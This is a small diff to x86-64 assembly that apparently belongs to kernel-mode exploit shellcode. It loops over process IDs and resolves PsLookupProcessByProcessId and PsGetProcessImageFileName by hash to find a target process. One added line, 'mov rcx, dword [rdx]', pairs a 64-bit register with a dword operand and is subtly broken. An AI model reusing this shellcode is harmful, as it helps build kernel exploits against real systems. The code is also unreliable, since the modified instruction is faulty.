@@ -19,6 +19,8 @@ _find_process_name_loop_pid:
   add cx, 0x4
   cmp ecx, 0x10000
   jge kernel_exit
+
+  push rdx
                                                 ; rcx = PID
                                                 ; rdx = *PEPROCESS
   mov r11d, PSLOOKUPPROCESSBYPROCESSID_HASH
@@ -28,8 +30,11 @@ _find_process_name_loop_pid:
   test rax, rax                                 ; see if STATUS_SUCCESS
   jnz _find_process_name_loop_pid
 
+
+  pop rdx
+  mov rcx, dword [rdx]                          ; *rcx = *PEPROCESS
+
   push rcx
-  mov rcx, [rdx]
   mov r11d, PSGETPROCESSIMAGEFILENAME_HASH
   call block_api_direct
   add rsp, 0x20
